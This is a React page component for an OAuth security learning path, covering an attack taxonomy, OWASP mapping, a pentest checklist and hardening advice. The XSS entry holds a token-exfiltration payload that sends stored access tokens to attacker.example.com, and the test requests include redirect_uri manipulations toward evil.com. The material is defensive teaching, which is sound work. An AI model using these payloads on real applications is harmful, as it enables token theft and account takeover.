"use client";

import React, { useState } from "react";
import Link from "next/link";
import { motion, AnimatePresence } from "framer-motion";
import {
  ChevronRight,
  ChevronDown,
  ShieldAlert,
  ShieldCheck,
  AlertTriangle,
  CheckCircle2,
  Info,
  Target,
  Bug,
  ClipboardList,
  Search,
  Lock,
  Zap,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Card, CardHeader, CardTitle, CardDescription, CardContent } from "@/components/ui/card";
import { Alert, AlertTitle, AlertDescription } from "@/components/ui/alert";
import { Accordion, AccordionItem, AccordionTrigger, AccordionContent } from "@/components/ui/accordion";
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";
import { Separator } from "@/components/ui/separator";
import { CodeBlock } from "@/components/ui/code-block";
import { ScrollReveal, StaggerReveal } from "@/components/layout/scroll-reveal";

// ─── Types ─────────────────────────────────────────────────────────────────

interface Attack {
  id: string;
  name: string;
  category: string;
  severity: "Critical" | "High" | "Medium" | "Low";
  cvssScore: string;
  rfc?: string;
  threat: string;
  vector: string;
  prerequisites: string;
  mitigation: string;
  testPayload?: string;
}

// ─── Attack taxonomy ────────────────────────────────────────────────────────

const attacks: Attack[] = [
  {
    id: "csrf",
    name: "CSRF / Missing State Parameter",
    category: "Authorization Endpoint",
    severity: "High",
    cvssScore: "8.1",
    rfc: "RFC 6749 §10.12",
    threat:
      "An attacker creates a crafted authorization URL and tricks a victim into visiting it. If the app does not validate the state parameter, the victim's session gets linked to the attacker's authorization code — logging the victim into the attacker's account (account linking attack).",
    vector:
      "Attacker hosts a page with an <img src='https://target.com/callback?code=ATTACKER_CODE'> tag. The victim's browser follows the link. The app exchanges the attacker's code for tokens and associates them with the victim's session.",
    prerequisites: "App does not generate and validate a random state parameter on the callback.",
    mitigation:
      "Generate a cryptographically random state value (at least 128 bits) before redirecting. Store it in sessionStorage. On callback, verify the returned state matches exactly. Reject the flow if it does not match or is missing. PKCE alone does not prevent this.",
    testPayload: `# Test: omit state parameter entirely
GET /authorize?response_type=code&client_id=app&redirect_uri=...
# (no state= parameter)

# If the app processes this callback without error, it is vulnerable.
# Expected: app should reject or warn about missing state.`,
  },
  {
    id: "pkce-downgrade",
    name: "PKCE Downgrade Attack",
    category: "Authorization Endpoint",
    severity: "High",
    cvssScore: "7.5",
    rfc: "OAuth 2.1 Security BCP §4.7",
    threat:
      "An authorization server that supports both PKCE and non-PKCE authorization code flows can be tricked into issuing a code without PKCE. A malicious client then intercepts the code and exchanges it for tokens without the verifier.",
    vector:
      "Attacker strips the code_challenge and code_challenge_method parameters from the authorization request. If the server allows PKCE to be optional, the issued code is not bound to any verifier and can be used by anyone who intercepts it.",
    prerequisites:
      "Authorization server allows optional PKCE (does not require code_challenge for public clients).",
    mitigation:
      "Authorization servers must require PKCE for all public clients (RFC 9700, OAuth 2.1). Resource servers should verify the token was obtained with PKCE. Clients should always send PKCE parameters and reject any flow that succeeds without them.",
    testPayload: `# Test: omit code_challenge from authorization request
GET /authorize?response_type=code
  &client_id=PUBLIC_CLIENT_ID
  &redirect_uri=https://app.example.com/callback
  &scope=openid
  &state=RANDOM_STATE
  # Note: no code_challenge or code_challenge_method

# If you receive a code and can exchange it without code_verifier,
# the server is vulnerable to PKCE downgrade.`,
  },
  {
    id: "token-theft",
    name: "Access Token Theft via XSS",
    category: "Client-Side",
    severity: "High",
    cvssScore: "8.8",
    threat:
      "An XSS vulnerability in the client application allows an attacker to inject JavaScript that reads and exfiltrates the access token. The attacker can then make API calls as the victim for the duration of the token's lifetime.",
    vector:
      "Injected script reads the token from localStorage, sessionStorage, or a global JavaScript variable. The script sends the token to an attacker-controlled endpoint. With a long-lived token or a refresh token, the attacker can maintain access indefinitely.",
    prerequisites:
      "Tokens stored in JavaScript-accessible storage (localStorage, sessionStorage, or JS variables). XSS vector exists in the application.",
    mitigation:
      "Store access tokens only in memory (JS module scope). Store refresh tokens in HttpOnly cookies via a Backend for Frontend (BFF). Implement Content Security Policy (CSP) to limit the impact of any XSS. Use short token lifetimes (under 15 minutes for high-risk operations).",
    testPayload: `// Basic XSS token exfiltration payload (for authorized pen testing only)
// Tests whether tokens are in accessible storage

javascript:fetch('https://attacker.example.com/steal?t='
  + encodeURIComponent(localStorage.getItem('access_token')
  || sessionStorage.getItem('access_token')
  || window.accessToken || 'NOT_FOUND'))

// If this returns a token value, storage is vulnerable.`,
  },
  {
    id: "redirect-uri",
    name: "Open Redirect / Redirect URI Manipulation",
    category: "Authorization Endpoint",
    severity: "Critical",
    cvssScore: "9.1",
    rfc: "RFC 9700 §4.1",
    threat:
      "An authorization server that does not perform exact redirect_uri matching allows attackers to manipulate the redirect target. The authorization code is delivered to the attacker's server instead of the legitimate app.",
    vector:
      "Using redirect_uri=https://app.example.com%2F.%2F.%2F%2Fattacker.example.com (path traversal) or redirect_uri=https://app.example.com.evil.com (subdomain matching) or a registered wildcard like redirect_uri=https://app.example.com/*.",
    prerequisites:
      "Authorization server uses prefix matching, pattern matching, or wildcard matching for redirect_uri validation instead of exact string matching.",
    mitigation:
      "Require exact redirect_uri matching at the authorization server. Register the exact URI for each environment (dev, staging, prod). Never use wildcards or prefix matching. Clients should always send the redirect_uri and servers should compare it character-by-character. RFC 9700 is explicit: only exact match is acceptable.",
    testPayload: `# Test 1: Path traversal in redirect_uri
GET /authorize?...&redirect_uri=https://app.example.com/%2F..%2Fattacker.example.com/

# Test 2: Subdomain manipulation
GET /authorize?...&redirect_uri=https://app.example.com.evil.com/callback

# Test 3: Parameter pollution
GET /authorize?...&redirect_uri=https://app.example.com&redirect_uri=https://evil.com

# Test 4: Fragment injection
GET /authorize?...&redirect_uri=https://app.example.com/callback#@evil.com`,
  },
  {
    id: "scope-escalation",
    name: "Scope Escalation",
    category: "Authorization Endpoint",
    severity: "High",
    cvssScore: "7.5",
    rfc: "RFC 6749 §3.3",
    threat:
      "An attacker manipulates the scope parameter to obtain an access token with more permissions than the user authorized. If the authorization server issues tokens without validating the requested scope against what was approved, the attacker gains elevated access.",
    vector:
      "Attacker modifies the scope in the authorization request or intercepts and modifies the token exchange request. If the server echoes back expanded scopes without user consent, the issued token has unauthorized permissions.",
    prerequisites:
      "Authorization server does not restrict scopes to what was explicitly registered for the client and approved by the user.",
    mitigation:
      "Authorization servers must validate that requested scopes are registered for the client and approved by the user. The token response must include the actual granted scope. Clients must check that the granted scope matches what they requested and reject tokens with unexpected scopes.",
    testPayload: `# Test: request scopes not registered for the client
GET /authorize?response_type=code
  &client_id=YOUR_CLIENT_ID
  &scope=openid+profile+email+admin:all+write:everything

# Inspect the token response — what scope was actually granted?
# If granted scopes exceed what the client registered for,
# the server has a scope validation vulnerability.`,
  },
  {
    id: "mix-up",
    name: "OAuth Mix-Up Attack",
    category: "Multi-AS Environments",
    severity: "Critical",
    cvssScore: "9.0",
    rfc: "RFC 9700 §4.4",
    threat:
      "In applications that support multiple authorization servers, an attacker tricks the client into sending a code or token to the wrong AS. The attacker controls one AS and uses it to harvest tokens intended for a legitimate AS.",
    vector:
      "User intends to log in via AS-A. Attacker intercepts and substitutes AS-B metadata, causing the client to redirect the user to AS-B. AS-B issues a code. Client sends this code to AS-A's token endpoint — AS-A sees it as a valid code (it came from AS-B's user) and may issue a token.",
    prerequisites:
      "Client supports multiple authorization servers without binding the state/code to a specific AS.",
    mitigation:
      "Include the issuer in the state parameter and verify it on callback. Use OIDC Issuer Discovery (iss parameter in the authorization response). Use the iss parameter added by RFC 9207. Clients must verify that the issuer in the response matches the one they originally redirected to.",
    testPayload: `# Test: swap the AS identifier between flow initiation and callback
# 1. Start flow targeting AS-A, record the state value
# 2. Deliver a code issued by AS-B with the same state
# 3. If the client exchanges it with AS-A, the mix-up is possible

# Modern mitigation: check the iss parameter in the callback
GET /callback?code=AS_B_CODE&state=ORIGINAL_STATE&iss=https://as-a.example.com
# If iss doesn't match the actual issuer, reject the flow`,
  },
];

// ─── OWASP mapping ─────────────────────────────────────────────────────────

const owaspMapping = [
  { owasp: "A01: Broken Access Control", oauth: "Scope escalation, missing authorization checks on API endpoints" },
  { owasp: "A02: Cryptographic Failures", oauth: "Tokens in HTTP (not HTTPS), weak state parameter generation, no PKCE" },
  { owasp: "A03: Injection (XSS)", oauth: "Token theft via XSS — directly enables token exfiltration" },
  { owasp: "A05: Security Misconfiguration", oauth: "Permissive redirect_uri matching, optional PKCE, debug endpoints exposed" },
  { owasp: "A07: Identification / Auth Failures", oauth: "Missing state validation (CSRF), PKCE downgrade, mix-up attacks" },
  { owasp: "A08: Software and Data Integrity", oauth: "JWT signature not validated, unverified issuer/audience claims" },
  { owasp: "A09: Logging / Monitoring Failures", oauth: "Not logging failed token validation attempts, token theft goes undetected" },
];

// ─── Pentest methodology ─────────────────────────────────────────────────────

const pentestCode = `# OAuth Penetration Testing — Methodology Checklist
# Run these tests against your own application with authorization only.

# ── 1. Reconnaissance ──────────────────────────────────────────────────────
# Discover OIDC/OAuth endpoints from the well-known document
curl https://auth.example.com/.well-known/openid-configuration | jq .

# Key fields to note:
# authorization_endpoint, token_endpoint, jwks_uri,
# introspection_endpoint, revocation_endpoint,
# code_challenge_methods_supported, response_types_supported

# ── 2. Authorization Endpoint Tests ────────────────────────────────────────
# 2a. Missing state parameter — should be rejected or trigger a warning
GET /authorize?response_type=code&client_id=CLIENT&redirect_uri=REDIR

# 2b. PKCE downgrade — omit code_challenge
GET /authorize?response_type=code&client_id=CLIENT&redirect_uri=REDIR&state=X

# 2c. Redirect URI manipulation — path traversal
GET /authorize?...&redirect_uri=https://legit.example.com/%2F..%2Fattacker.com/

# 2d. Open redirect in post-login redirect_to parameter
GET /login?redirect_to=https://evil.com

# 2e. Scope fishing — request undocumented scopes
GET /authorize?...&scope=admin:all offline_access read:everything

# ── 3. Token Endpoint Tests ─────────────────────────────────────────────────
# 3a. Code replay — try using the same code twice
POST /token  # Exchange code for tokens
POST /token  # Exchange the same code again — should return error

# 3b. Code injection — attempt to use a code from a different client
POST /token
  grant_type=authorization_code&code=<code_for_other_client>
  &client_id=YOUR_CLIENT&redirect_uri=YOUR_REDIR

# 3c. Missing code_verifier — try omitting it when PKCE was used
POST /token
  grant_type=authorization_code&code=<pkce_code>
  &client_id=CLIENT&redirect_uri=REDIR
  # No code_verifier — should fail

# ── 4. Token Validation Tests ───────────────────────────────────────────────
# 4a. Algorithm confusion — change alg from RS256 to none
# Create a "none" JWT: header.payload. (empty signature)
# If the API accepts it, alg=none is allowed

# 4b. JWT audience not checked
# Use a valid JWT issued for a different audience
# If the API accepts it, aud validation is missing

# 4c. Expired token acceptance — use a token with exp in the past
# Manually set exp=1 in a test JWT
# If the API accepts it, exp validation is missing

# ── 5. Refresh Token Tests ──────────────────────────────────────────────────
# 5a. Refresh token reuse after rotation
# Obtain tokens, use refresh token to get new set
# Try using the old refresh token again — should be revoked

# 5b. Refresh token for a different client
POST /token
  grant_type=refresh_token
  &refresh_token=<token_from_client_A>
  &client_id=client_b  # different client

# ── 6. Token Storage Tests (Browser) ───────────────────────────────────────
# Open browser DevTools > Application tab
# Check: localStorage, sessionStorage, cookies (look for HttpOnly flag)
# Run: document.cookie — should not show auth tokens
# Run: Object.keys(localStorage) — should not contain token keys`;

// ─── Severity badge helper ─────────────────────────────────────────────────

function SeverityBadge({ severity }: { severity: Attack["severity"] }) {
  const styles = {
    Critical: "border-red-300 text-red-600 dark:border-red-700 dark:text-red-400 bg-red-50 dark:bg-red-950/30",
    High: "border-orange-300 text-orange-600 dark:border-orange-700 dark:text-orange-400 bg-orange-50 dark:bg-orange-950/30",
    Medium: "border-yellow-300 text-yellow-600 dark:border-yellow-700 dark:text-yellow-400 bg-yellow-50 dark:bg-yellow-950/30",
    Low: "border-blue-300 text-blue-600 dark:border-blue-700 dark:text-blue-400 bg-blue-50 dark:bg-blue-950/30",
  };
  return (
    <span className={`inline-flex items-center text-xs font-semibold px-2 py-0.5 rounded border ${styles[severity]}`}>
      {severity}
    </span>
  );
}

// ─── Main page ─────────────────────────────────────────────────────────────

export default function SecurityPathPage() {
  const [expandedAttack, setExpandedAttack] = useState<string | null>(null);

  return (
    <div className="max-w-4xl mx-auto px-4 py-10 sm:px-6 lg:px-8">
      {/* Breadcrumb */}
      <div className="flex items-center gap-2 text-sm text-muted-foreground mb-6 flex-wrap">
        <Link href="/" className="hover:text-foreground transition-colors">Home</Link>
        <ChevronRight className="w-4 h-4" />
        <Link href="/paths" className="hover:text-foreground transition-colors">Learning Paths</Link>
        <ChevronRight className="w-4 h-4" />
        <span className="text-foreground font-medium">Security Specialist</span>
      </div>

      {/* Header */}
      <div className="mb-10">
        <div className="flex items-center gap-3 mb-2 flex-wrap">
          <div className="flex items-center justify-center w-10 h-10 rounded-lg bg-destructive/10 text-destructive shrink-0">
            <ShieldAlert className="w-5 h-5" />
          </div>
          <h1 className="text-3xl font-bold">Security Specialist Path</h1>
          <Badge className="bg-red-100 text-red-900 dark:bg-red-900/40 dark:text-red-400 border-red-200 dark:border-red-800">
            Advanced
          </Badge>
        </div>
        <p className="text-muted-foreground max-w-2xl">
          A comprehensive guide to OAuth threat modeling, the complete attack taxonomy, security testing
          methodology, and OWASP mapping. Aimed at security engineers, pentesters, and developers auditing
          production OAuth deployments.
        </p>
      </div>

      <Alert className="mb-8 border-amber-300 bg-amber-50 dark:bg-amber-950/30 dark:border-amber-700">
        <AlertTriangle className="w-4 h-4 text-amber-600 dark:text-amber-400" />
        <AlertTitle className="text-amber-700 dark:text-amber-400">Authorized Testing Only</AlertTitle>
        <AlertDescription className="text-amber-700 dark:text-amber-500">
          The attack payloads and testing techniques in this guide are for educational purposes and authorized
          security testing only. Only test systems you own or have explicit written permission to test.
        </AlertDescription>
      </Alert>

      {/* ── Section 1: Threat Model ───────────────────────────── */}
      <ScrollReveal>
        <section className="mb-12">
          <h2 className="text-2xl font-bold mb-4">1. OAuth Threat Model</h2>
          <p className="text-muted-foreground text-sm mb-4">
            OAuth 2.0 has a well-defined attack surface described in RFC 6819 (OAuth Threat Model) and the
            OAuth Security BCP (RFC 9700). Understanding the threat model is the first step to securing any
            OAuth deployment.
          </p>

          <StaggerReveal className="grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
            {[
              {
                icon: <Target className="w-4 h-4 text-red-500" />,
                title: "Authorization Endpoint",
                threats: ["CSRF via missing state", "PKCE downgrade", "Redirect URI manipulation", "Open redirects", "Scope fishing"],
              },
              {
                icon: <Target className="w-4 h-4 text-orange-500" />,
                title: "Token Endpoint",
                threats: ["Authorization code replay", "Code injection (cross-client)", "Credential stuffing", "Missing PKCE validation"],
              },
              {
                icon: <Target className="w-4 h-4 text-yellow-500" />,
                title: "Access Token",
                threats: ["Token leakage via Referer", "Token theft via XSS", "Alg:none attack", "Missing aud/iss validation"],
              },
              {
                icon: <Target className="w-4 h-4 text-violet-500" />,
                title: "Refresh Token",
                threats: ["Refresh token theft", "Missing rotation", "Cross-client refresh reuse", "Infinite session via rotate"],
              },
              {
                icon: <Target className="w-4 h-4 text-blue-500" />,
                title: "Client Application",
                threats: ["XSS → token theft", "CSRF on logout", "Clickjacking on consent", "Client secret exposure"],
              },
              {
                icon: <Target className="w-4 h-4 text-emerald-500" />,
                title: "Authorization Server",
                threats: ["Mix-up attacks", "SSRF via redirect_uri", "Consent screen bypass", "Discovery doc manipulation"],
              },
            ].map((area) => (
              <Card key={area.title}>
                <CardHeader className="pb-2">
                  <div className="flex items-center gap-2">
                    {area.icon}
                    <CardTitle className="text-sm">{area.title}</CardTitle>
                  </div>
                </CardHeader>
                <CardContent>
                  <ul className="space-y-1">
                    {area.threats.map((t) => (
                      <li key={t} className="flex items-start gap-1.5 text-xs text-muted-foreground">
                        <span className="mt-1.5 w-1 h-1 rounded-full bg-muted-foreground shrink-0" />
                        {t}
                      </li>
                    ))}
                  </ul>
                </CardContent>
              </Card>
            ))}
          </StaggerReveal>
        </section>
      </ScrollReveal>

      <Separator className="mb-10" />

      {/* ── Section 2: Attack Taxonomy ────────────────────────── */}
      <ScrollReveal>
        <section className="mb-12">
          <h2 className="text-2xl font-bold mb-2">2. Complete Attack Taxonomy</h2>
          <p className="text-muted-foreground text-sm mb-6">
            Click each attack to expand its full description: threat model, attack vector, prerequisites,
            mitigation, and a sample test payload.
          </p>

          <div className="space-y-3">
            {attacks.map((attack) => (
              <div key={attack.id} className="rounded-lg border overflow-hidden">
                <button
                  onClick={() =>
                    setExpandedAttack(expandedAttack === attack.id ? null : attack.id)
                  }
                  className="w-full flex items-center justify-between gap-3 px-4 py-3 hover:bg-muted/30 transition-colors text-left"
                >
                  <div className="flex items-center gap-3 flex-wrap min-w-0">
                    <Bug className="w-4 h-4 text-destructive shrink-0" />
                    <span className="font-medium truncate">{attack.name}</span>
                    <SeverityBadge severity={attack.severity} />
                    <span className="text-xs text-muted-foreground shrink-0">
                      CVSS {attack.cvssScore}
                    </span>
                    <Badge variant="outline" className="text-xs shrink-0">{attack.category}</Badge>
                    {attack.rfc && (
                      <span className="text-xs text-muted-foreground shrink-0">{attack.rfc}</span>
                    )}
                  </div>
                  <motion.div
                    animate={{ rotate: expandedAttack === attack.id ? 180 : 0 }}
                    transition={{ duration: 0.2 }}
                    className="shrink-0"
                  >
                    <ChevronDown className="w-4 h-4 text-muted-foreground" />
                  </motion.div>
                </button>

                <AnimatePresence initial={false}>
                  {expandedAttack === attack.id && (
                    <motion.div
                      initial={{ height: 0, opacity: 0 }}
                      animate={{ height: "auto", opacity: 1 }}
                      exit={{ height: 0, opacity: 0 }}
                      transition={{ duration: 0.25, ease: "easeOut" }}
                      className="overflow-hidden border-t"
                    >
                      <div className="px-4 py-4 space-y-4">
                        <div className="grid gap-4 sm:grid-cols-2">
                          <div>
                            <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground mb-1.5">
                              Threat Description
                            </p>
                            <p className="text-sm text-muted-foreground">{attack.threat}</p>
                          </div>
                          <div>
                            <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground mb-1.5">
                              Attack Vector
                            </p>
                            <p className="text-sm text-muted-foreground">{attack.vector}</p>
                          </div>
                        </div>

                        <div className="grid gap-4 sm:grid-cols-2">
                          <div>
                            <p className="text-xs font-semibold uppercase tracking-wide text-amber-600 dark:text-amber-400 mb-1.5">
                              Prerequisites
                            </p>
                            <p className="text-sm text-muted-foreground">{attack.prerequisites}</p>
                          </div>
                          <div>
                            <p className="text-xs font-semibold uppercase tracking-wide text-emerald-600 dark:text-emerald-400 mb-1.5">
                              Mitigation
                            </p>
                            <p className="text-sm text-muted-foreground">{attack.mitigation}</p>
                          </div>
                        </div>

                        {attack.testPayload && (
                          <div>
                            <p className="text-xs font-semibold uppercase tracking-wide text-blue-600 dark:text-blue-400 mb-1.5">
                              Test Payload (Authorized Testing Only)
                            </p>
                            <CodeBlock code={attack.testPayload} language="bash" />
                          </div>
                        )}
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            ))}
          </div>
        </section>
      </ScrollReveal>

      <Separator className="mb-10" />

      {/* ── Section 3: OWASP Mapping ──────────────────────────── */}
      <ScrollReveal>
        <section className="mb-12">
          <h2 className="text-2xl font-bold mb-2">3. OWASP Top 10 Relation to OAuth</h2>
          <p className="text-muted-foreground text-sm mb-4">
            OAuth vulnerabilities map directly to multiple OWASP Top 10 categories. If you are doing an
            OWASP-based security assessment, OAuth flows should be part of your test scope for each of
            these categories.
          </p>

          <div className="rounded-lg border overflow-hidden">
            <table className="w-full text-sm">
              <thead className="bg-muted/50">
                <tr>
                  <th className="px-4 py-2 text-left font-medium w-2/5">OWASP Top 10 (2021)</th>
                  <th className="px-4 py-2 text-left font-medium">OAuth-Specific Risks</th>
                </tr>
              </thead>
              <tbody className="divide-y">
                {owaspMapping.map((row) => (
                  <tr key={row.owasp} className="hover:bg-muted/30 transition-colors">
                    <td className="px-4 py-2 font-medium text-xs">{row.owasp}</td>
                    <td className="px-4 py-2 text-xs text-muted-foreground">{row.oauth}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      </ScrollReveal>

      <Separator className="mb-10" />

      {/* ── Section 4: Pentesting Methodology ────────────────── */}
      <ScrollReveal>
        <section className="mb-12">
          <h2 className="text-2xl font-bold mb-2">4. Penetration Testing Methodology for OAuth</h2>
          <p className="text-muted-foreground text-sm mb-4">
            A structured approach to testing OAuth endpoints. Use this as a repeatable checklist when
            assessing any OAuth implementation.
          </p>

          <Tabs defaultValue="methodology">
            <TabsList className="mb-4">
              <TabsTrigger value="methodology">
                <Search className="w-4 h-4 mr-1.5" />
                Test Cases
              </TabsTrigger>
              <TabsTrigger value="tools">
                <Zap className="w-4 h-4 mr-1.5" />
                Tooling
              </TabsTrigger>
            </TabsList>

            <TabsContent value="methodology">
              <CodeBlock code={pentestCode} language="bash" filename="oauth-pentest.sh" />
            </TabsContent>

            <TabsContent value="tools">
              <div className="grid gap-4 sm:grid-cols-2">
                {[
                  {
                    name: "Burp Suite",
                    purpose: "Intercept and modify OAuth requests. Use the OAuth scanner extension for automated discovery. Essential for redirect_uri and state parameter testing.",
                  },
                  {
                    name: "OWASP ZAP",
                    purpose: "Automated scanning for common OAuth misconfigurations. Free and open source. Add the OAuth scanner add-on.",
                  },
                  {
                    name: "jwt_tool",
                    purpose: "Python CLI for JWT attacks: alg:none, algorithm confusion (RS256→HS256), JWKS injection, claim tampering. github.com/ticarpi/jwt_tool",
                  },
                  {
                    name: "OAuth 2.0 Playground (Google)",
                    purpose: "Legitimate reference implementation for comparing correct vs. buggy behavior. Useful for understanding expected request/response flows.",
                  },
                  {
                    name: "Swagger UI / API docs",
                    purpose: "Often exposes the exact OAuth scopes, endpoints, and error messages needed for targeted testing. Look for /api-docs, /swagger.json, /openapi.yaml.",
                  },
                  {
                    name: "Postman",
                    purpose: "Built-in OAuth 2.0 flow support. Useful for quickly testing token endpoint variations and crafting custom token exchange requests.",
                  },
                ].map((tool) => (
                  <Card key={tool.name}>
                    <CardHeader className="pb-1">
                      <CardTitle className="text-sm">{tool.name}</CardTitle>
                    </CardHeader>
                    <CardContent className="text-xs text-muted-foreground">{tool.purpose}</CardContent>
                  </Card>
                ))}
              </div>
            </TabsContent>
          </Tabs>
        </section>
      </ScrollReveal>

      <Separator className="mb-10" />

      {/* ── Section 5: Hardening Checklist ───────────────────── */}
      <ScrollReveal>
        <section className="mb-12">
          <h2 className="text-2xl font-bold mb-4">5. OAuth Security Hardening Checklist</h2>

          <Accordion type="multiple" className="space-y-2">
            {[
              {
                id: "as",
                label: "Authorization Server Configuration",
                icon: <Lock className="w-4 h-4 text-primary" />,
                items: [
                  { ok: true, text: "Exact redirect_uri matching enforced (no wildcards, no prefix matching)" },
                  { ok: true, text: "PKCE required for all public clients (S256 only — reject plain)" },
                  { ok: true, text: "Authorization codes expire in 60 seconds or less" },
                  { ok: true, text: "Authorization codes are single-use (replay detection)" },
                  { ok: true, text: "Refresh token rotation enabled" },
                  { ok: true, text: "Refresh token reuse detection: revoke entire tree on reuse" },
                  { ok: true, text: "Token lifetimes appropriate: access token < 1h, refresh token per risk level" },
                  { ok: true, text: "Rate limiting on token endpoint per client_id" },
                  { ok: true, text: "HTTPS enforced on all endpoints" },
                  { ok: false, text: "Debug/token inspect endpoints exposed to the internet" },
                ],
              },
              {
                id: "client",
                label: "Client Application",
                icon: <ShieldCheck className="w-4 h-4 text-primary" />,
                items: [
                  { ok: true, text: "State parameter generated (128-bit random) and validated on every callback" },
                  { ok: true, text: "PKCE with S256 used on every authorization request" },
                  { ok: true, text: "Access tokens stored in memory only (not localStorage or sessionStorage)" },
                  { ok: true, text: "Refresh tokens in HttpOnly, Secure, SameSite=Strict cookies via BFF" },
                  { ok: true, text: "Content Security Policy (CSP) header configured" },
                  { ok: true, text: "Tokens never logged (request/response loggers must scrub Authorization headers)" },
                  { ok: true, text: "Logout revokes the access token and refresh token at the AS" },
                  { ok: false, text: "client_secret in client-side JavaScript or mobile binary" },
                ],
              },
              {
                id: "rs",
                label: "Resource Server (API)",
                icon: <ShieldCheck className="w-4 h-4 text-primary" />,
                items: [
                  { ok: true, text: "JWT signature validated against AS public keys (JWKS)" },
                  { ok: true, text: "iss (issuer) claim validated — must match the expected AS" },
                  { ok: true, text: "aud (audience) claim validated — must match this API" },
                  { ok: true, text: "exp (expiry) validated with clock skew tolerance of ≤ 30 seconds" },
                  { ok: true, text: "Scopes checked for every protected endpoint" },
                  { ok: true, text: "JWKS cached and refreshed on key rotation (not fetched per-request)" },
                  { ok: true, text: "Rate limiting keyed by sub or client_id claim, not just IP" },
                  { ok: false, text: "alg:none accepted — must explicitly allowlist RS256 / ES256" },
                ],
              },
            ].map((section) => (
              <AccordionItem key={section.id} value={section.id} className="border rounded-lg px-4">
                <AccordionTrigger className="hover:no-underline">
                  <div className="flex items-center gap-2">
                    {section.icon}
                    <span className="font-medium">{section.label}</span>
                  </div>
                </AccordionTrigger>
                <AccordionContent className="pt-2 pb-4">
                  <div className="space-y-2">
                    {section.items.map((item, i) => (
                      <div
                        key={i}
                        className={`flex items-start gap-2.5 rounded px-2.5 py-1.5 text-sm ${
                          item.ok
                            ? "bg-emerald-50 dark:bg-emerald-950/20"
                            : "bg-red-50 dark:bg-red-950/20"
                        }`}
                      >
                        {item.ok ? (
                          <CheckCircle2 className="w-4 h-4 text-emerald-500 mt-0.5 shrink-0" />
                        ) : (
                          <AlertTriangle className="w-4 h-4 text-destructive mt-0.5 shrink-0" />
                        )}
                        <span className={item.ok ? "text-foreground" : "text-destructive"}>
                          {item.text}
                        </span>
                      </div>
                    ))}
                  </div>
                </AccordionContent>
              </AccordionItem>
            ))}
          </Accordion>
        </section>
      </ScrollReveal>

      <Separator className="mb-10" />

      {/* ── Section 6: References ─────────────────────────────── */}
      <ScrollReveal>
        <section className="mb-12">
          <h2 className="text-2xl font-bold mb-4">6. Key References and RFCs</h2>
          <div className="grid gap-3 sm:grid-cols-2">
            {[
              { ref: "RFC 6749", title: "OAuth 2.0 Authorization Framework", note: "The foundational spec" },
              { ref: "RFC 6819", title: "OAuth 2.0 Threat Model and Security Considerations", note: "Comprehensive threat analysis" },
              { ref: "RFC 7519", title: "JSON Web Token (JWT)", note: "Token format specification" },
              { ref: "RFC 7636", title: "PKCE for OAuth Public Clients", note: "PKCE specification" },
              { ref: "RFC 7662", title: "Token Introspection", note: "Introspection endpoint spec" },
              { ref: "RFC 8252", title: "OAuth 2.0 for Native Apps", note: "Mobile app best practices" },
              { ref: "RFC 9207", title: "iss Parameter in Authorization Response", note: "Mix-up attack mitigation" },
              { ref: "RFC 9700", title: "OAuth 2.0 Security Best Current Practice", note: "Latest security guidance (2024)" },
            ].map((ref) => (
              <div key={ref.ref} className="flex items-start gap-3 rounded-lg border px-3 py-2.5">
                <Badge variant="outline" className="text-xs mt-0.5 shrink-0 font-mono">{ref.ref}</Badge>
                <div>
                  <p className="text-sm font-medium">{ref.title}</p>
                  <p className="text-xs text-muted-foreground">{ref.note}</p>
                </div>
              </div>
            ))}
          </div>
        </section>
      </ScrollReveal>

      {/* Next steps */}
      <ScrollReveal>
        <Card className="border-primary/30 bg-primary/5">
          <CardContent className="pt-4">
            <div className="flex items-center gap-2 mb-2">
              <ClipboardList className="w-5 h-5 text-primary" />
              <span className="font-semibold">Apply Your Knowledge</span>
            </div>
            <p className="text-sm text-muted-foreground mb-3">
              Security knowledge is only useful when applied. Use the interactive checklist and the Edge
              Case Library to audit a real deployment.
            </p>
            <div className="flex flex-wrap gap-2">
              <Button asChild size="sm" variant="outline">
                <Link href="/checklist">Production Security Checklist</Link>
              </Button>
              <Button asChild size="sm" variant="outline">
                <Link href="/edge-cases">Edge Case Library</Link>
              </Button>
              <Button asChild size="sm" variant="outline">
                <Link href="/playground">Token Inspector</Link>
              </Button>
            </div>
          </CardContent>
        </Card>
      </ScrollReveal>
    </div>
  );
}
